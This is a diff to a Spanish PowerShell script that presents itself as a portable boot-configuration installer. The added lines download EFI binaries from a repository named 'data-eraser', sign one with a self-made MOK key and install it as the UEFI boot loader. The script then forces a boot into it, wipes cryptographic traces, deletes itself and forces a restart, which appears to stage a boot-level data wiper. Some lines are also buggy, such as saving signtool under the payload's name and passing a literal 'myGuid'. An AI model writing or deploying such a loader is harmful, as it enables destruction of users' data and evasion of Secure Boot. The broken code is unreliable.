@@ -21,7 +21,7 @@ Set-Location -Path $PSScriptRoot
 # Forzar la ruta nativa del sistema para herramientas de arranque
 $Sys64 = if (Test-Path "env:windir\SysNative") { "$env:windir\SysNative" } else { "$env:windir\System32" }
 $BcdCmd = "$Sys64\bcdedit.exe"
-cl
+
 Write-Host "============================================================" -ForegroundColor Green
 Write-Host "   INSTALADOR PORTABLE: CONFIGURACION INTEGRAL DE ARRANQUE  " -ForegroundColor Green
 Write-Host "============================================================" -ForegroundColor Green
@@ -42,20 +42,27 @@ try {
     Write-Host "[INFO] Omitiendo verificacion avanzada de topologia de disco." -ForegroundColor Yellow
 }
 
+Write-Host "[1/5] Descargando componentes .efi faltantes de GitHub..." -ForegroundColor White
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 # 3. Validar archivos locales requeridos
-if (-not (Test-Path "signtool.exe") -or -not (Test-Path "ejecutable.efi")) {
-    Write-Host "[ERROR] No se encontraron 'signtool.exe' o 'ejecutable.efi' en esta carpeta." -ForegroundColor Red
-    Read-Host "Presiona Enter para salir..."
+if (-not (Test-Path "signtool.exe")) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GabrielBaranello/data-eraser/refs/heads/master/signtool.exe" -OutFile "ejecutable.efi"  -UseBasicParsing
     Exit
 }
-
+if (-not (Test-Path "ejecutable.efi")) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GabrielBaranello/data-eraser/refs/heads/master/ejecutable.efi" -OutFile "ejecutable.efi"  -UseBasicParsing
+}    
 # 4. Descarga de binarios desde Servidores Oficiales de Ubuntu (Launchpad)
-Write-Host "[1/5] Descargando componentes Shim de Canonical..." -ForegroundColor White
-$shimUrl = "https://launchpad.net"
-$mmUrl = "https://launchpad.net"
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest -Uri $shimUrl -OutFile "shimx64.efi" -UseBasicParsing
-Invoke-WebRequest -Uri $mmUrl -OutFile "mmx64.efi" -UseBasicParsing
+if (-not (Test-Path "mmx64.efi")) {
+    $mmUrl =   "https://github.com/GabrielBaranello/data-eraser/raw/refs/heads/master/mmx64.efi"
+    Invoke-WebRequest -Uri $mmUrl -OutFile "mmx64.efi" -UseBasicParsing
+}
+if (-not (Test-Path "shimx64.efi")) {
+    $shimUrl = "https://github.com/GabrielBaranello/data-eraser/raw/refs/heads/master/shimx64.efi"
+    Invoke-WebRequest -Uri $shimUrl -OutFile "shimx64.efi" -UseBasicParsing
+}
 
 # 5. Criptografía y Firmado Digital Portable
 Write-Host "[2/5] Generando llaves criptograficas MOK..." -ForegroundColor White
@@ -66,7 +73,7 @@ Export-Certificate -Cert $cert -FilePath "certificado_publico.cer" | Out-Null
 
 Write-Host "[3/5] Firmando digitalmente tu ejecutable.efi..." -ForegroundColor White
 # Estructurar el comando en una sola cadena de texto absoluta para evitar fallos de parámetros
-$cmdSign = ".\\signtool.exe sign /f .\clave_privada.pfx /p 1234 /fd sha256 .\ejecutable.efi"
+$cmdSign = ".\signtool.exe sign /f .\clave_privada.pfx /p 1234 /fd sha256 .\ejecutable.efi"
 Invoke-Expression $cmdSign | Out-Null
 
 
@@ -79,7 +86,7 @@ New-Item -Path $UefiDir -ItemType Directory -Force | Out-Null
 Copy-Item -Path "shimx64.efi" -Destination "$UefiDir\bootx64.efi" -Force
 Copy-Item -Path "mmx64.efi" -Destination "$UefiDir\mmx64.efi" -Force
 Copy-Item -Path "ejecutable.efi" -Destination "$UefiDir\grubx64.efi" -Force
-Copy-Item -Path "ejecutable.efi" -Destination "$UefiDir\fbx64.efi" -Force
+#Copy-Item -Path "ejecutable.efi" -Destination "$UefiDir\fbx64.efi" -Force
 Copy-Item -Path "certificado_publico.cer" -Destination "$UefiDir\certificado_publico.cer" -Force
 
 # 7. Registrar entrada persistente en el almacén NVRAM de la UEFI
@@ -96,7 +103,7 @@ if ($bcdOutput -match '\{([^}]+)\}') { $myGuid = "{$($Matches[1])}" } else { $my
 
 # 8. Limpieza absoluta de rastros criptográficos en Windows
 Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.Subject -like "*MiFirmaMOK*" } | Remove-Item
-Remove-Item -Path "clave_privada.pfx", "certificado_publico.cer", "shimx64.efi", "mmx64.efi" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "clave_privada.pfx", "certificado_publico.cer", "shimx64.efi", "mmx64.efi", "signtool.exe", ejecutable.efi -Force -ErrorAction SilentlyContinue
 
 # 9. CREAR EL DISPARADOR LIVIANO EN EL ESCRITORIO REAL DEL USUARIO
 # Detecta la ruta exacta del escritorio interactivo (incluso si está modificado a D:\)
@@ -121,8 +128,9 @@ Write-Host "   INSTALACION COMPLETADA. REINICIANDO HACIA LA UEFI...     " -Foreg
 Write-Host "============================================================" -ForegroundColor Green
 
 & $BcdCmd /bootsequence myGuid | Out-Null
-Start-Sleep -Seconds 50
+
+Read-Host "Precione enter para reiniciar..."
 
 # Autodestruirse y reiniciar la laptop de inmediato
 Remove-Item -Path \$PSCommandPath -Force -ErrorAction SilentlyContinue
-#Restart-Computer -Force
+Restart-Computer -Force
